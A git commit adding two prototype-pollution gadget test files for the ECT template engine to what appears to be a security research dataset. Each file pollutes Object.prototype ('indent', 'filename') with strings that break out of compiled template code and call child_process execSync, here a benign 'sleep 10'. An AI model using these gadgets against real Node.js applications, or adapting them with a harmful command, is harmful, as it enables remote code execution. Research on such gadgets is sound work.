c90ff47691df8c498441b4b4d4a95f8c0cf2eebe
jackfromeast <thisiszhengyu@gmail.com>
2023-07-10 03:19:12 +0000

    add new gadgets in ect(coffee-script)

--- dataset/ppgadgets/ect/app-0.js
+++ dataset/ppgadgets/ect/app-0.js
@@ -7,6 +7,8 @@ catch(e){
     console.log("[!] symbolic execution not enabled")
 }
 
+Object.prototype.indent = "process.mainModule.require('child_process').execSync('sleep 10')\n//";
+
 var renderer = ECT({ root : {
 				layout: '<html><head><title><%- @title %></title></head><body><% content %></body></html>',
 				page: '<% extend "layout" %><p>Page content</p>'
--- dataset/ppgadgets/ect/app-1.js
+++ dataset/ppgadgets/ect/app-1.js
@@ -7,6 +7,15 @@ catch(e){
     console.log("[!] symbolic execution not enabled")
 }
 
-var ectRenderer = ECT({ watch: true, root: __dirname + '/views', ext : '.ect' });
+Object.prototype.inlineMap = true;
+Object.prototype.filename = "\n})\nprocess.mainModule.require('child_process').execSync('sleep 10')\n({";
 
-ectRenderer.render('index');
+var renderer = ECT({ root : {
+				layout: '<html><head><title><%- @title %></title></head><body><% content %></body></html>',
+				page: '<% extend "layout" %><p>Page content</p>'
+				}
+			});
+
+var html = renderer.render('page', { title: 'Hello, World!' });
+
+// console.log(html);
